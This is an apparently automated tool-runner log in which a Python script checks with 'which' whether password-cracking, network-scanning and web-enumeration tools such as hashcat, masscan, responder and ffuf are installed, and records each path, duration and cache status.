2025-10-24 06:15:12,152 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,152 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,152 - __main__ - INFO - 💾 Cached result for command: which john
2025-10-24 06:15:12,152 - __main__ - INFO - 🔍 Cache MISS for command: which hashcat
2025-10-24 06:15:12,152 - __main__ - INFO - 🚀 EXECUTING: which hashcat
2025-10-24 06:15:12,152 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,153 - __main__ - INFO - 🆔 PROCESS: PID 3023 started
2025-10-24 06:15:12,153 - __main__ - INFO - 🆔 REGISTERED: Process 3023 - which hashcat...
2025-10-24 06:15:12,153 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3023
2025-10-24 06:15:12,155 - __main__ - INFO - 📤 STDOUT: /usr/bin/hashcat
2025-10-24 06:15:12,158 - __main__ - INFO - 🧹 CLEANUP: Process 3023 removed from registry
2025-10-24 06:15:12,158 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,158 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,158 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,158 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,158 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which hashcat
2025-10-24 06:15:12,158 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,158 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 06:15:12,158 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,158 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,158 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,158 - __main__ - INFO - 💾 Cached result for command: which hashcat
2025-10-24 06:15:12,158 - __main__ - INFO - 🔍 Cache MISS for command: which rustscan
2025-10-24 06:15:12,158 - __main__ - INFO - 🚀 EXECUTING: which rustscan
2025-10-24 06:15:12,158 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,159 - __main__ - INFO - 🆔 PROCESS: PID 3028 started
2025-10-24 06:15:12,159 - __main__ - INFO - 🆔 REGISTERED: Process 3028 - which rustscan...
2025-10-24 06:15:12,160 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3028
2025-10-24 06:15:12,161 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/rustscan
2025-10-24 06:15:12,163 - __main__ - INFO - 🧹 CLEANUP: Process 3028 removed from registry
2025-10-24 06:15:12,163 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,164 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,164 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,164 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,164 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which rustscan
2025-10-24 06:15:12,164 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,164 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 24 bytes
2025-10-24 06:15:12,164 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,164 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,164 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,164 - __main__ - INFO - 💾 Cached result for command: which rustscan
2025-10-24 06:15:12,164 - __main__ - INFO - 🔍 Cache MISS for command: which masscan
2025-10-24 06:15:12,164 - __main__ - INFO - 🚀 EXECUTING: which masscan
2025-10-24 06:15:12,164 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,164 - __main__ - INFO - 🆔 PROCESS: PID 3033 started
2025-10-24 06:15:12,164 - __main__ - INFO - 🆔 REGISTERED: Process 3033 - which masscan...
2025-10-24 06:15:12,165 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3033
2025-10-24 06:15:12,167 - __main__ - INFO - 📤 STDOUT: /usr/bin/masscan
2025-10-24 06:15:12,167 - __main__ - INFO - 🧹 CLEANUP: Process 3033 removed from registry
2025-10-24 06:15:12,167 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,167 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,167 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,167 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,167 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which masscan
2025-10-24 06:15:12,167 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,167 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 06:15:12,167 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,167 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,167 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,167 - __main__ - INFO - 💾 Cached result for command: which masscan
2025-10-24 06:15:12,167 - __main__ - INFO - 🔍 Cache MISS for command: which autorecon
2025-10-24 06:15:12,167 - __main__ - INFO - 🚀 EXECUTING: which autorecon
2025-10-24 06:15:12,167 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,168 - __main__ - INFO - 🆔 PROCESS: PID 3038 started
2025-10-24 06:15:12,168 - __main__ - INFO - 🆔 REGISTERED: Process 3038 - which autorecon...
2025-10-24 06:15:12,168 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3038
2025-10-24 06:15:12,170 - __main__ - INFO - 📤 STDOUT: /usr/bin/autorecon
2025-10-24 06:15:12,173 - __main__ - INFO - 🧹 CLEANUP: Process 3038 removed from registry
2025-10-24 06:15:12,173 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,173 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,173 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,173 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,173 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which autorecon
2025-10-24 06:15:12,173 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,173 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 19 bytes
2025-10-24 06:15:12,173 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,173 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,173 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,173 - __main__ - INFO - 💾 Cached result for command: which autorecon
2025-10-24 06:15:12,173 - __main__ - INFO - 🔍 Cache MISS for command: which nbtscan
2025-10-24 06:15:12,173 - __main__ - INFO - 🚀 EXECUTING: which nbtscan
2025-10-24 06:15:12,173 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,173 - __main__ - INFO - 🆔 PROCESS: PID 3043 started
2025-10-24 06:15:12,173 - __main__ - INFO - 🆔 REGISTERED: Process 3043 - which nbtscan...
2025-10-24 06:15:12,174 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3043
2025-10-24 06:15:12,176 - __main__ - INFO - 📤 STDOUT: /usr/bin/nbtscan
2025-10-24 06:15:12,179 - __main__ - INFO - 🧹 CLEANUP: Process 3043 removed from registry
2025-10-24 06:15:12,179 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,179 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,179 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,179 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,179 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which nbtscan
2025-10-24 06:15:12,179 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,179 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 06:15:12,179 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,179 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,179 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,179 - __main__ - INFO - 💾 Cached result for command: which nbtscan
2025-10-24 06:15:12,179 - __main__ - INFO - 🔍 Cache MISS for command: which arp-scan
2025-10-24 06:15:12,179 - __main__ - INFO - 🚀 EXECUTING: which arp-scan
2025-10-24 06:15:12,179 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,180 - __main__ - INFO - 🆔 PROCESS: PID 3048 started
2025-10-24 06:15:12,180 - __main__ - INFO - 🆔 REGISTERED: Process 3048 - which arp-scan...
2025-10-24 06:15:12,180 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3048
2025-10-24 06:15:12,182 - __main__ - INFO - 📤 STDOUT: /usr/sbin/arp-scan
2025-10-24 06:15:12,185 - __main__ - INFO - 🧹 CLEANUP: Process 3048 removed from registry
2025-10-24 06:15:12,185 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,185 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,185 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,185 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,185 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which arp-scan
2025-10-24 06:15:12,185 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,185 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 19 bytes
2025-10-24 06:15:12,185 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,185 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,185 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,185 - __main__ - INFO - 💾 Cached result for command: which arp-scan
2025-10-24 06:15:12,185 - __main__ - INFO - 🔍 Cache MISS for command: which responder
2025-10-24 06:15:12,185 - __main__ - INFO - 🚀 EXECUTING: which responder
2025-10-24 06:15:12,185 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,186 - __main__ - INFO - 🆔 PROCESS: PID 3053 started
2025-10-24 06:15:12,186 - __main__ - INFO - 🆔 REGISTERED: Process 3053 - which responder...
2025-10-24 06:15:12,187 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3053
2025-10-24 06:15:12,188 - __main__ - INFO - 📤 STDOUT: /usr/sbin/responder
2025-10-24 06:15:12,190 - __main__ - INFO - 🧹 CLEANUP: Process 3053 removed from registry
2025-10-24 06:15:12,190 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,190 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,190 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,190 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,190 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which responder
2025-10-24 06:15:12,190 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,190 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 20 bytes
2025-10-24 06:15:12,190 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,190 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,191 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,191 - __main__ - INFO - 💾 Cached result for command: which responder
2025-10-24 06:15:12,191 - __main__ - INFO - 🔍 Cache MISS for command: which nxc
2025-10-24 06:15:12,191 - __main__ - INFO - 🚀 EXECUTING: which nxc
2025-10-24 06:15:12,191 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,191 - __main__ - INFO - 🆔 PROCESS: PID 3058 started
2025-10-24 06:15:12,191 - __main__ - INFO - 🆔 REGISTERED: Process 3058 - which nxc...
2025-10-24 06:15:12,192 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3058
2025-10-24 06:15:12,194 - __main__ - INFO - 📤 STDOUT: /usr/bin/nxc
2025-10-24 06:15:12,197 - __main__ - INFO - 🧹 CLEANUP: Process 3058 removed from registry
2025-10-24 06:15:12,197 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,197 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,198 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,198 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,198 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which nxc
2025-10-24 06:15:12,198 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,198 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 13 bytes
2025-10-24 06:15:12,198 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,198 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,198 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,198 - __main__ - INFO - 💾 Cached result for command: which nxc
2025-10-24 06:15:12,198 - __main__ - INFO - 🔍 Cache MISS for command: which enum4linux-ng
2025-10-24 06:15:12,198 - __main__ - INFO - 🚀 EXECUTING: which enum4linux-ng
2025-10-24 06:15:12,198 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,198 - __main__ - INFO - 🆔 PROCESS: PID 3063 started
2025-10-24 06:15:12,198 - __main__ - INFO - 🆔 REGISTERED: Process 3063 - which enum4linux-ng...
2025-10-24 06:15:12,199 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3063
2025-10-24 06:15:12,201 - __main__ - INFO - 📤 STDOUT: /usr/bin/enum4linux-ng
2025-10-24 06:15:12,204 - __main__ - INFO - 🧹 CLEANUP: Process 3063 removed from registry
2025-10-24 06:15:12,204 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,204 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,204 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,204 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,204 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which enum4linux-ng
2025-10-24 06:15:12,204 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,204 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 23 bytes
2025-10-24 06:15:12,204 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,204 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,204 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,204 - __main__ - INFO - 💾 Cached result for command: which enum4linux-ng
2025-10-24 06:15:12,204 - __main__ - INFO - 🔍 Cache MISS for command: which rpcclient
2025-10-24 06:15:12,204 - __main__ - INFO - 🚀 EXECUTING: which rpcclient
2025-10-24 06:15:12,204 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,204 - __main__ - INFO - 🆔 PROCESS: PID 3068 started
2025-10-24 06:15:12,204 - __main__ - INFO - 🆔 REGISTERED: Process 3068 - which rpcclient...
2025-10-24 06:15:12,205 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3068
2025-10-24 06:15:12,207 - __main__ - INFO - 📤 STDOUT: /usr/bin/rpcclient
2025-10-24 06:15:12,209 - __main__ - INFO - 🧹 CLEANUP: Process 3068 removed from registry
2025-10-24 06:15:12,209 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,209 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,209 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,209 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,209 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which rpcclient
2025-10-24 06:15:12,209 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,209 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 19 bytes
2025-10-24 06:15:12,209 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,209 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,209 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,209 - __main__ - INFO - 💾 Cached result for command: which rpcclient
2025-10-24 06:15:12,209 - __main__ - INFO - 🔍 Cache MISS for command: which enum4linux
2025-10-24 06:15:12,209 - __main__ - INFO - 🚀 EXECUTING: which enum4linux
2025-10-24 06:15:12,209 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,210 - __main__ - INFO - 🆔 PROCESS: PID 3073 started
2025-10-24 06:15:12,210 - __main__ - INFO - 🆔 REGISTERED: Process 3073 - which enum4linux...
2025-10-24 06:15:12,211 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3073
2025-10-24 06:15:12,212 - __main__ - INFO - 📤 STDOUT: /usr/bin/enum4linux
2025-10-24 06:15:12,213 - __main__ - INFO - 🧹 CLEANUP: Process 3073 removed from registry
2025-10-24 06:15:12,213 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,213 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,213 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,213 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,213 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which enum4linux
2025-10-24 06:15:12,213 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,213 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 20 bytes
2025-10-24 06:15:12,213 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,213 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,213 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,213 - __main__ - INFO - 💾 Cached result for command: which enum4linux
2025-10-24 06:15:12,213 - __main__ - INFO - 🔍 Cache MISS for command: which ffuf
2025-10-24 06:15:12,213 - __main__ - INFO - 🚀 EXECUTING: which ffuf
2025-10-24 06:15:12,213 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,213 - __main__ - INFO - 🆔 PROCESS: PID 3078 started
2025-10-24 06:15:12,213 - __main__ - INFO - 🆔 REGISTERED: Process 3078 - which ffuf...
2025-10-24 06:15:12,214 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3078
2025-10-24 06:15:12,216 - __main__ - INFO - 📤 STDOUT: /usr/bin/ffuf
2025-10-24 06:15:12,218 - __main__ - INFO - 🧹 CLEANUP: Process 3078 removed from registry
2025-10-24 06:15:12,218 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,218 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,218 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,218 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,218 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which ffuf
2025-10-24 06:15:12,218 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,218 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 14 bytes
2025-10-24 06:15:12,218 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,218 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,218 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,218 - __main__ - INFO - 💾 Cached result for command: which ffuf
2025-10-24 06:15:12,218 - __main__ - INFO - 🔍 Cache MISS for command: which feroxbuster
2025-10-24 06:15:12,218 - __main__ - INFO - 🚀 EXECUTING: which feroxbuster
2025-10-24 06:15:12,218 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,219 - __main__ - INFO - 🆔 PROCESS: PID 3083 started
2025-10-24 06:15:12,219 - __main__ - INFO - 🆔 REGISTERED: Process 3083 - which feroxbuster...
2025-10-24 06:15:12,219 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3083
2025-10-24 06:15:12,222 - __main__ - INFO - 📤 STDOUT: /usr/bin/feroxbuster
2025-10-24 06:15:12,225 - __main__ - INFO - 🧹 CLEANUP: Process 3083 removed from registry
2025-10-24 06:15:12,225 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,225 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,225 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,225 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,225 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which feroxbuster
2025-10-24 06:15:12,225 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,225 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 21 bytes
2025-10-24 06:15:12,225 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,225 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,225 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,225 - __main__ - INFO - 💾 Cached result for command: which feroxbuster
2025-10-24 06:15:12,225 - __main__ - INFO - 🔍 Cache MISS for command: which dirsearch
2025-10-24 06:15:12,225 - __main__ - INFO - 🚀 EXECUTING: which dirsearch
2025-10-24 06:15:12,225 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,225 - __main__ - INFO - 🆔 PROCESS: PID 3088 started
2025-10-24 06:15:12,225 - __main__ - INFO - 🆔 REGISTERED: Process 3088 - which dirsearch...
2025-10-24 06:15:12,227 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3088
2025-10-24 06:15:12,228 - __main__ - INFO - 📤 STDOUT: /usr/bin/dirsearch
2025-10-24 06:15:12,229 - __main__ - INFO - 🧹 CLEANUP: Process 3088 removed from registry
2025-10-24 06:15:12,229 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,229 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,229 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
